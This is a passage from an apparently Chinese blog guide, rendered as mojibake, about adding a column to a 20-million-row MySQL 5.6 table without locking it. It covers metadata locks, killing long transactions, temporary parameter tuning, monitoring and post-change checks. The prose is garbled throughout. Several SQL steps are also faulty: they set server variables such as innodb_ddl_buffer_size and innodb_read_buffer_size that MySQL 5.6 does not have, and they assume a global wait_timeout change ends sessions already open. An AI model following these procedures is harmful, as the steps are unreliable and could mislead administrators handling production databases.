<li><span style="font-family: &quot;Microsoft YaHei&quot;">DDL æ§è¡åéè·åè¡¨çMDL æä»éï¼X éï¼ï¼èæ®éè¯»åæä½ä¼ææMDL å±äº«éï¼S éï¼ï¼X éä¸ä»»ä½éäºæ¥ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">è¥æ§è¡ DDL æ¶è¡¨ä¸å­å¨æªæäº¤é¿äºå¡ãæ¢æ¥è¯¢ãç©ºé²é¿è¿æ¥ï¼ææ S éæªéæ¾ï¼ï¼DDL ä¼è¿å¥<code>Waiting for table metadata lock</code>ç¶æï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6 ç MDL éç­å¾ä¸ºé»å¡å¼ä¸æ è¶æ¶æºå¶ï¼åç»­ææè¯»åè¯·æ±ï¼åæ¬æ°ç SELECTï¼é½ä¼æéé»å¡ï¼è¡¨ç°ä¸º âè¡¨è¢«éãæ¥è¯¢å¤±æâã</span></li>
</ol>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">2.4&nbsp;èæ¶éçº¿æ§çæ ¸å¿åå </span></h3>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">72 ä¸è¡è¡¨ 203 ç§çæµè¯ç»ææ æ³çº¿æ§æ¨ç® 2000 ä¸è¡è¡¨èæ¶ï¼å  MySQL 5.6 æ§è¡ä¼ååç DDL æ¶ï¼åä½è¡èæ¶ä¼éæ°æ®éå¢å¤§èéä½ï¼</span></p>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">å¤§è¡¨æ¯ææ¹éåæ·è´ï¼è½åååæ¥ç£çè¿ç»­ IO ä¼å¿ï¼åå°å¯»éæ¶é´ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">å¤§è¡¨å¤çè¿ç¨ä¸­InnoDB ç¼å²æ± ç¼å­å½ä¸­çæ´é«ï¼åå°ç©ç IO æ¬¡æ°ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">å°è¡¨æ°æ®åæ£ï¼å­å¨é¨åéæº IOï¼è°åº¦å IO å¼éç¸å¯¹æ´é«ã</span></li>
</ol>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸ãéé MySQL 5.6 çæä¼ DDL è¯­å¥</span></h2>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">éå¯¹ 2000 ä¸è¡è¡¨ãBIGINT ç±»åãé»è®¤å¼ 0 çéæ±ï¼ç»å MySQL 5.6 çä¼åç¹æ§ï¼ç¡®å®æä¼ DDL è¯­å¥ï¼æ¾å¼æå®ææå±æ§ä»¥æå¤§åè§¦åä¼åï¼</span></p>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">ALTER</span> <span style="color: rgba(0, 0, 255, 1)">TABLE</span><span style="color: rgba(0, 0, 0, 1)"> è¡¨å 
</span><span style="color: rgba(0, 0, 255, 1)">ADD</span> <span style="color: rgba(0, 0, 255, 1)">COLUMN</span> å­æ®µå <span style="color: rgba(0, 0, 255, 1)">BIGINT</span>(<span style="color: rgba(128, 0, 0, 1); font-weight: bold">19</span>) <span style="color: rgba(128, 128, 128, 1)">NOT</span> <span style="color: rgba(0, 0, 255, 1)">NULL</span> <span style="color: rgba(0, 0, 255, 1)">DEFAULT</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">0</span> COMMENT <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">æ³¨é</span><span style="color: rgba(255, 0, 0, 1)">'</span>;</span></pre>
</div>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">è¯­å¥å³é®å±æ§è¯´æ</span></p>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;"><code>BIGINT(19)</code>ï¼åçæ°å¼ç±»åï¼åå¼èå´è¦çè¶å¤§æ´æ°ï¼-9223372036854775808~9223372036854775807ï¼ï¼19 ä¸ºæ¾ç¤ºå®½åº¦ï¼å¹éæç¬¦å·æå¤§ä½æ°ï¼ä¸éå¶å®éåå¼ï¼ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;"><code>NOT NULL DEFAULT 0</code>ï¼æ ¸å¿ä¼åç¹ï¼ç®åå¸¸éé»è®¤å¼è§¦å MySQL 5.6 æ¹éèµå¼ä¼åï¼éç©ºè®¾ç½®é¿å NULL å¼ï¼ç®åä¸å¡ä»£ç ç©ºå¼å¤æ­ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">æ¾å¼æ³¨éï¼æåè¡¨ç»æå¯è¯»æ§ï¼ä¾¿äºåç»­ç»´æ¤ã</span></li>
</ol>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">è¥éæ°å¢ VARCHAR ç±»åå­æ®µï¼éæ¾å¼æå®<code>DEFAULT ''</code>è§¦åä¼åï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">ALTER</span> <span style="color: rgba(0, 0, 255, 1)">TABLE</span><span style="color: rgba(0, 0, 0, 1)"> è¡¨å
</span><span style="color: rgba(0, 0, 255, 1)">ADD</span> <span style="color: rgba(0, 0, 255, 1)">COLUMN</span> å­æ®µå <span style="color: rgba(0, 0, 255, 1)">VARCHAR</span>(<span style="color: rgba(128, 0, 0, 1); font-weight: bold">50</span>) <span style="color: rgba(0, 0, 255, 1)">DEFAULT</span> <span style="color: rgba(255, 0, 0, 1)">''</span> COMMENT <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">æ³¨é</span><span style="color: rgba(255, 0, 0, 1)">'</span>;</span></pre>
</div>
</div>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">åãçäº§ç¯å¢æ éè½å°å¨æµç¨æ¹æ¡</span></h2>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">4.1 æ§è¡ååå¤ï¼æ¸éæº + ä½å³°æ + åæ°è°ä¼ï¼æ ¸å¿é¿åï¼</span></h3>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.1.1 éæ©æè´ä½å³°ææ§è¡</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">å»ºè®®ï¼ä¼åéæ©åæ¨ 2:00-4:00ï¼æå¶ä»ä¸å¡ä½å³°æï¼åå°æ´»è·äºå¡ï¼éä½ MDL éç­å¾æ¦çã</span></div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.1.2 å¼ºå¶æ¸çéæºï¼å¿åï¼é¿å MDL éç­å¾ï¼</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ§è¡ DDL åè¸¢æç©ºé²é¿è¿æ¥ãç»æ­¢é¿äºå¡ / æ¢æ¥è¯¢ï¼éæ¾æææªæäº¤ç S éï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 1. ä¸´æ¶ç¼©ç­é¿è¿æ¥è¶æ¶æ¶é´ï¼è¸¢æç©ºé²è¿æ¥</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL wait_timeout <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">10</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL interactive_timeout <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">10</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SELECT</span> SLEEP(<span style="color: rgba(128, 0, 0, 1); font-weight: bold">15</span>); <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> ç­å¾15ç§è®©è¿æ¥èªå¨æ­å¼</span><span style="color: rgba(0, 128, 128, 1)">
--</span><span style="color: rgba(0, 128, 128, 1)"> 2. æ¢å¤é¿è¿æ¥è¶æ¶é»è®¤å¼ï¼8å°æ¶ï¼</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL wait_timeout <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">28800</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL interactive_timeout <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">28800</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> 3. ä¸»å¨ç»æ­¢ç®æ è¡¨ä¸çæ¢æ¥è¯¢/é¿äºå¡ï¼æ¿æ¢åºåãè¡¨åï¼</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span> CONCAT(<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">KILL </span><span style="color: rgba(255, 0, 0, 1)">'</span>, id, <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">;</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">) 
</span><span style="color: rgba(0, 0, 255, 1)">FROM</span><span style="color: rgba(0, 0, 0, 1)"> INFORMATION_SCHEMA.PROCESSLIST 
</span><span style="color: rgba(0, 0, 255, 1)">WHERE</span> db <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">æ°æ®åºå</span><span style="color: rgba(255, 0, 0, 1)">'</span> 
  <span style="color: rgba(128, 128, 128, 1)">AND</span> info <span style="color: rgba(128, 128, 128, 1)">LIKE</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">%è¡¨å%</span><span style="color: rgba(255, 0, 0, 1)">'</span> 
  <span style="color: rgba(128, 128, 128, 1)">AND</span> Time <span style="color: rgba(128, 128, 128, 1)">&gt;</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">30</span> 
  <span style="color: rgba(128, 128, 128, 1)">AND</span> Command <span style="color: rgba(128, 128, 128, 1)">IN</span> (<span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">Query</span><span style="color: rgba(255, 0, 0, 1)">'</span>, <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">Sleep</span><span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">);
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ§è¡ä¸è¿°æ¥è¯¢çæçKILLè¯­å¥ï¼éæ¾Sé</span></span></pre>
</div>
</div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.1.3 ä¸´æ¶ MySQL åæ°è°ä¼ï¼æé + åå°èµæºç«äºï¼</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">å¯éï¼å¨æè°æ´åæ°ï¼æ ééå¯ï¼DDL å®æåæ¢å¤ï¼æ ¸å¿ä¼å DDL æ§è¡æçå IO å©ç¨çï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> è°å¤§DDLä¸ç¨ç¼å²åºï¼æåæ¹éæ·è´æçï¼é»è®¤1Mï¼è°è³16Mï¼</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_ddl_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">16</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> åå°åæä½IOå¼éï¼é¿åæ°çé¿äºå¡</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_flush_log_at_trx_commit <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">2</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> è°å¤§è¯»åç¼å²åºï¼ç¼è§£ç¼å­ç«äº</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_read_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">16</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_write_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">8</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span>;</span></pre>
</div>
</div>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">4.2 æ§è¡ä¸­ï¼å®æ¶çæ§ + ç¶æå¤æ­ + èµæºç®¡æ§</span></h3>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.2.1 æ ¸å¿ç¶æå¤æ­ï¼ç¡®è®¤ MDL éè·åæåï¼</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">éè¿<code>SHOW FULL PROCESSLIST;</code>æ¥ç DDL è¿ç¨ç¶æï¼è±ç¦»éè¡¨é£é©æçæ ¸å¿æ å¿ï¼</span></div>
<ul>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">é£é©ç¶æï¼<code>State = Waiting for table metadata lock</code>ï¼æªè·å MDL éï¼é»å¡åç»­ææè¯»åï¼ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">æ­£å¸¸ç¶æï¼<code>State = executing</code> æ <code>State = copying to tmp table</code>ï¼MDL éå·²æåè·åï¼DDL æ éæ§è¡ä¸­ï¼äºèä¸º MySQL 5.6 å½åå·®å¼ï¼ç­ææ éï¼ã</span></li>
</ul>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">ç²¾åè¿æ»¤ DDL è¿ç¨çæ¥è¯¢è¯­å¥ï¼é¿åç¿»æ¾ï¼ï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">SELECT</span><span style="color: rgba(0, 0, 0, 1)"> id, command, state, info, time 
</span><span style="color: rgba(0, 0, 255, 1)">FROM</span><span style="color: rgba(0, 0, 0, 1)"> INFORMATION_SCHEMA.PROCESSLIST 
</span><span style="color: rgba(0, 0, 255, 1)">WHERE</span> info <span style="color: rgba(128, 128, 128, 1)">LIKE</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">%è¡¨å%</span><span style="color: rgba(255, 0, 0, 1)">'</span> 
  <span style="color: rgba(128, 128, 128, 1)">AND</span> command <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(255, 0, 0, 1)">'</span><span style="color: rgba(255, 0, 0, 1)">ALTER TABLE</span><span style="color: rgba(255, 0, 0, 1)">'</span>;</span></pre>
</div>
</div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.2.2 å®æ¶èµæºçæ§</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ éæç»­ç¯å®ï¼1 åéæ¥ç 1 æ¬¡æ ¸å¿ææ ï¼é¿åèµæºèå°½ï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> çæ§ç£çIOï¼æ ¸å¿ï¼%utilä¸ºå³é®ææ ï¼æ§å¶å¨â¤80%ï¼</span>
iostat -x 1
<span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> çæ§MySQLçCPU/åå­å ç¨</span>
top -p `pidof mysqld`</span></pre>
</div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¥çInnoDB DDLæ§è¡ç¶æï¼ç¡®è®¤å¢éæ¥å¿åæ­¥æ­£å¸¸</span>
SHOW ENGINE INNODB STATUS\G;</span></pre>
</div>
</div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.2.3 è¯»åéçªå¢çåºå¯¹æ¹æ¡</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">å¯éï¼è¥æ§è¡æé´ä¸å¡è¯»åéå¢å ï¼IO å©ç¨ç &gt; 90%ï¼ï¼æ éä¸­æ­ DDLï¼ä¸­æ­ä¼å¯¼è´ä¹åçå·¥ä½ç½è´¹ï¼ï¼éè¿è½»éæä½ç¼è§£èµæºç«äºï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> ä¸´æ¶å³é­èªéåºå·æ°ï¼åå°åå°IO</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_adaptive_flushing <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(0, 0, 255, 1)">OFF</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> è¥ä¸å¡æ¯æï¼ä¸´æ¶å¨æéæµï¼Javaä¸å¡ä¾§å¼å³ï¼ï¼å°QPSéå¶å¨æ¥å¸¸60%-70%</span></span></pre>
</div>
</div>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">4.3 æ§è¡åï¼æ¢å¤éç½® + å¨ç»´åº¦éªè¯ï¼å¿åï¼</span></h3>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.3.1 æ¢å¤ MySQL é»è®¤éç½®</span></h4>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">å°ä¸´æ¶è°æ´çåæ°æ¢å¤é»è®¤ï¼ä¿è¯æ°æ®åºé¿æè¿è¡çæ§è½åæ°æ®å®å¨æ§ï¼</span></div>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¢å¤DDLç¼å²åº</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_ddl_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¢å¤æ¥å¿å·çå®å¨çº§å«ï¼ä¿è¯å®æºä¸ä¸¢æ°æ®ï¼æ ¸å¿ï¼</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_flush_log_at_trx_commit <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¢å¤è¯»åç¼å²åº</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_read_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">1</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_write_buffer_size <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(128, 0, 0, 1); font-weight: bold">8</span><span style="color: rgba(128, 128, 128, 1)">*</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">1024</span><span style="color: rgba(0, 0, 0, 1)">;
</span><span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¢å¤èªéåºå·æ°</span>
<span style="color: rgba(0, 0, 255, 1)">SET</span> GLOBAL innodb_adaptive_flushing <span style="color: rgba(128, 128, 128, 1)">=</span> <span style="color: rgba(0, 0, 255, 1)">ON</span>;</span></pre>
</div>
</div>
<h4><span style="font-family: &quot;Microsoft YaHei&quot;">4.3.2 DDL æ§è¡æåçå¨ç»´åº¦éªè¯</span></h4>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">è¡¨ç»æéªè¯ï¼ç¡®è®¤æ°å­æ®µå±æ§å®å¨ç¬¦åé¢æ</span></p>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">DESC</span> è¡¨å; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> å¿«éæ¥çå­æ®µå±æ§</span>
SHOW <span style="color: rgba(0, 0, 255, 1)">CREATE</span> <span style="color: rgba(0, 0, 255, 1)">TABLE</span> è¡¨å; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> ç²¾åç¡®è®¤å®æ´å®ä¹</span></span></pre>
</div>
</div>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">æ°æ®éªè¯ï¼ç¡®è®¤æ°å­æ®µé»è®¤å¼èµå¼æ­£å¸¸ï¼æ ç©ºå¼</span></p>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">SELECT</span> id, æ°å¢å­æ®µå <span style="color: rgba(0, 0, 255, 1)">FROM</span> è¡¨åLIMIT <span style="color: rgba(128, 0, 0, 1); font-weight: bold">20</span>; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> éæºæ¥è¯¢é»è®¤å¼</span>
<span style="color: rgba(0, 0, 255, 1)">SELECT</span> <span style="color: rgba(255, 0, 255, 1)">COUNT</span>(<span style="color: rgba(128, 128, 128, 1)">*</span>) <span style="color: rgba(0, 0, 255, 1)">FROM</span> è¡¨å <span style="color: rgba(0, 0, 255, 1)">WHERE</span> æ°å¢å­æ®µå <span style="color: rgba(0, 0, 255, 1)">IS</span> <span style="color: rgba(128, 128, 128, 1)">NOT</span> <span style="color: rgba(0, 0, 255, 1)">NULL</span>; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> å¨ééªè¯éç©º</span></span></pre>
</div>
</div>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">è¯»åéªè¯ï¼æ¨¡æä¸å¡æä½ï¼ç¡®è®¤è¯»åæ­£å¸¸</span></p>
<div>
<div class="cnblogs_code">
<pre><span style="font-family: &quot;Microsoft YaHei&quot;"><span style="color: rgba(0, 0, 255, 1)">UPDATE</span> è¡¨å <span style="color: rgba(0, 0, 255, 1)">SET</span> æ°å¢å­æ®µå<span style="color: rgba(128, 128, 128, 1)">=</span><span style="color: rgba(128, 0, 0, 1); font-weight: bold">2</span> <span style="color: rgba(0, 0, 255, 1)">WHERE</span> id<span style="color: rgba(128, 128, 128, 1)">=</span>xxx; <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¨¡ææ´æ°</span>
<span style="color: rgba(0, 0, 255, 1)">INSERT</span> <span style="color: rgba(0, 0, 255, 1)">INTO</span> è¡¨å (id, æ°å¢å­æ®µå) <span style="color: rgba(0, 0, 255, 1)">VALUES</span> (xxx, <span style="color: rgba(128, 0, 0, 1); font-weight: bold">3</span>); <span style="color: rgba(0, 128, 128, 1)">--</span><span style="color: rgba(0, 128, 128, 1)"> æ¨¡ææå¥</span></span></pre>
</div>
</div>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸å¡éªè¯ï¼è§å¯ Java å¤çº¿ç¨ä¸å¡æ¥å¿ï¼ç¡®è®¤æ è¶æ¶ãæ¥éãäºå¡åæ»ç­å¼å¸¸ã</span></p>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">äºãå³é®é®é¢ä¸è§£å³æ¹æ¡æ±æ»</span></h2>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">&nbsp;</span></div>
<div>
<div>
<table>
<thead>
<tr><th><span style="font-family: &quot;Microsoft YaHei&quot;">æ ¸å¿é®é¢</span></th><th><span style="font-family: &quot;Microsoft YaHei&quot;">è§£å³æ¹æ¡</span></th><th><span style="font-family: &quot;Microsoft YaHei&quot;">å³é®è¦ç¹</span></th></tr>
</thead>
<tbody>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">DDL æ§è¡æ¢ï¼å¨è¡¨æ·è´ï¼</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ¾å¼æå®ç®åé»è®¤å¼ï¼è§¦å MySQL 5.6 æ¹éèµå¼ä¼å</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ°å¼ç±»åä¼åææä¼äº VARCHARï¼BIGINT (19) DEFAULT 0 æä¼</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">çº¿æ§æ¨ç®èæ¶åå·®å¤§</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ éæ¨ç®ï¼2000 ä¸è¡è¡¨ SSD ç£ç 5-8 åéï¼æºæ¢°ç¡¬ç 12-18 åé</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">å¤§è¡¨æ¹éæ·è´ãç¼å­å½ä¸­çé«ãè¿ç»­ IO ä¼å¿éä½åä½è¡èæ¶</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">MDL éç­å¾å¯¼è´éè¡¨</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">ä½å³°ææ§è¡ + æ¸çéæºï¼è¸¢é¿è¿æ¥ãç»æ­¢é¿äºå¡ï¼</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ§è¡åå¿åï¼é¿å DDL è¿å¥ Waiting for table metadata lock ç¶æ</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">é«é¢è¯»ååºæ¯èµæºç«äº</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸´æ¶åæ°è°ä¼ + è½»ééæµï¼å¯éï¼</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">ä»å¼å IO/CPU ç«äºï¼æ éè¡¨é£é©ï¼ä¸å¡å»¶è¿è½»å¾®æ³¢å¨</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ§è¡æé´è¯»åéçªå¢</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">çæ§èµæºææ  + ä¸´æ¶éä½ IO å·çé¢ç</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">æ éä¸­æ­ DDLï¼MySQL ä¼èªå¨ééèµæºï¼ä¼åä¿éä¸å¡</span></td>
</tr>
<tr>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">DDL ç¶æå¤æ­å°é¾</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">éè¿ SHOW FULL PROCESSLIST æ¥ç State å</span></td>
<td><span style="font-family: &quot;Microsoft YaHei&quot;">executing/copying to tmp table ä¸ºæ­£å¸¸æ éç¶æ</span></td>
</tr>
</tbody>
</table>
</div>
</div>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">&nbsp;</span></div>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">å­ãé¿åæåï¼ç»å¯¹ç¦æ­¢çæä½</span></h2>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">ç¦æ­¢å¨ä¸å¡é«å³°æ / ä¸­å³°ææ§è¡ DDLï¼å³ä½¿åäºè°ä¼ï¼é«å³°æ IO å·²æ¥è¿ç¶é¢ï¼ä¼å¯¼è´ä¸å¡å»¶è¿å¤§å¹å¢å ï¼è§¦åè¶æ¶éè¯ï¼</span></li>
